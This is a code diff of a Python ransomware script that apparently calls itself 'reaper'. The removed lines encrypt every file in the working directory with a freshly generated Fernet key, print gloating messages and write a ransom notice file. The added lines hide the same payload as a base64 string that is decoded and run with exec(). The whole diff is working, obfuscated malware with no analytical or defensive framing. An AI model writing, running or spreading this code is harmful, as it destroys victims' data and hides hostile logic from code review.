@@ -1,32 +1,9 @@
 #!/usr/bin/env python3
 
-import os
-from cryptography.fernet import Fernet
+import base64
 
+script = ("IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwoKaW1wb3J0IG9zCmZyb20gY3J5cHRvZ3JhcGh5LmZlcm5ldCBpbXBvcnQgRmVybmV0CgoKZmlsZXMgPSBbXQoKZm9yIGZpbGUgaW4gb3MubGlzdGRpcigpOgoJaWYgZmlsZT09InJlYXBlci5weSIgb3IgZmlsZSA9PSAia2V5LmtleSIgb3IgZmlsZT09InJlYXBlcmRlY3J5cHRvci5weSIgb3IgZmlsZSA9PSJGSUxFU0VOQ1JZUFRFRC50eHQiOgoJCWNvbnRpbnVlCglpZiBvcy5wYXRoLmlzZmlsZShmaWxlKToKCQlmaWxlcy5hcHBlbmQoZmlsZSkKCmtleSA9IEZlcm5ldC5nZW5lcmF0ZV9rZXkoKQoKd2l0aCBvcGVuKCJrZXkua2V5IiwgIndiIikgYXMgdGhla2V5OgoJdGhla2V5LndyaXRlKGtleSkKCmZvciBmaWxlIGluIGZpbGVzOgoJd2l0aCBvcGVuKGZpbGUsICJyYiIpIGFzIHRoZWZpbGU6CgkJY29udGVudHMgPSB0aGVmaWxlLnJlYWQoKQoJY29udGVudHNfZW5jcnlwdGVkICA9IEZlcm5ldChrZXkpLmVuY3J5cHQoY29udGVudHMpCgl3aXRoIG9wZW4oZmlsZSwgIndiIikgYXMgdGhlZmlsZToKCQl0aGVmaWxlLndyaXRlKGNvbnRlbnRzX2VuY3J5cHRlZCkKCnByaW50ICgiIEFsbCB5b3VyIGZpbGVzIGFyZSBlbmNyeXB0ZWQhIEx1Y2tpbHkgd2UgaGF2ZSBhIGRlY29kZXIhIDspIikKcHJpbnQgKCIgRmluZCBhbmQgcnVuIHJlYXBlcmRlY3J5cHRvci5weSBpbiB0aGUgY29tbWFuZCB0ZXJtaW5hbCB0byBnZXQgeW91ciBmaWxlcyBiYWNrISIpCgoKbm90aWNlID0gKCJlY2hvICdZb3VyIGZpbGVzIGFyZSBlbmNyeXB0ZWQhIFJ1biBvdXIgbWFnaWNhbCBkZWNyeXB0b3IgdG8gZ2V0IHRoZW0gYmFjayEnID4gRklMRVNFTkNSWVBURUQudHh0IikKb3Muc3lzdGVtKG5vdGljZSk=")
 
-files = []
+decodedscript = base64.b64decode(script)
 
-for file in os.listdir():
-	if file=="reaper.py" or file == "key.key" or file=="reaperdecryptor.py" or file =="FILESENCRYPTED.txt":
-		continue
-	if os.path.isfile(file):
-		files.append(file)
-
-key = Fernet.generate_key()
-
-with open("key.key", "wb") as thekey:
-	thekey.write(key)
-
-for file in files:
-	with open(file, "rb") as thefile:
-		contents = thefile.read()
-	contents_encrypted  = Fernet(key).encrypt(contents)
-	with open(file, "wb") as thefile:
-		thefile.write(contents_encrypted)
-
-print (" All your files are encrypted! Luckily we have a decoder! ;)")
-print (" Find and run reaperdecryptor.py in the command terminal to get your files back!")
-
-
-notice = ("echo 'Your files are encrypted! Run our magical decryptor to get them back!' > FILESENCRYPTED.txt")
-os.system(notice)
+exec(decodedscript)
